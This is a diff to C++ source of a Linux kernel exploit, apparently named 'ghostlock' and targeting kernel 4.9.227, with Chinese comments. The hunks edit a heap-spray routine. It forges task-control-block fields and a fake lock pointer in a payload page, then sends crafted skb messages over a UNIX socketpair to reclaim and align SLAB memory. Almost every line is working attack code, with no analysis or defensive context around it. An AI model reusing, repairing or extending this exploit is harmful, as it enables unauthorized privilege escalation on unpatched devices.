@@ -248,7 +248,6 @@ namespace ghostlock::support {
             put64(p, kernel::W0_OFF + 0x28, (session::g_exploit_session.heap.current.fake_lock)); 
             
             /* 4.9 进程伪造控制块喷射覆写 */
-            put32(p, fake_task_off + kernel::FAKE_TASK_USAGE_OFF, 0x100);
             put32(p, fake_task_off + ft_prio_off, kernel::FAKE_TASK_PRIO);
             put32(p, fake_task_off + ft_nprio_off, kernel::FAKE_TASK_PRIO);
             put32(p, fake_task_off + ft_pi_lock_off, 0);
@@ -299,14 +298,18 @@ namespace ghostlock::support {
             return 0;
         }
 
-        // 正确解包 reclaim_sv 数组：通过索引形式 reclaim_sv[0] 传入底层系统调用
+        // ==================== 终极修正后的 4.9.227 内核管道操作块 ====================
         SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv.data()));
         session::g_exploit_session.heap.current.state = memory::PayloadPageState::Current;
         
         int32_t sndbuf = 1 << 20;
+        // 1. 修正为 reclaim_sv[0]
         setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+        
+        // 2. 修正为 reclaim_sv[0]
         int32_t reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
         if (reclaim_flags >= 0) {
+            // 3. 修正为 reclaim_sv[0]
             fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
         }
 
@@ -320,6 +323,7 @@ namespace ghostlock::support {
 
         // 发送特定伪造的 skb 数据包到内核协议栈进行 SLAB 内存抢占与对齐
         for (int i = 0; i < kernel::SKB_RECLAIM_SENDS; i++) {
+            // 4. 修正为 reclaim_sv[0]
             (void)sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
         }
 
@@ -338,4 +342,3 @@ namespace ghostlock::support {
         return prepare_kernel_page(&request);
     }
 } // namespace ghostlock::support
-
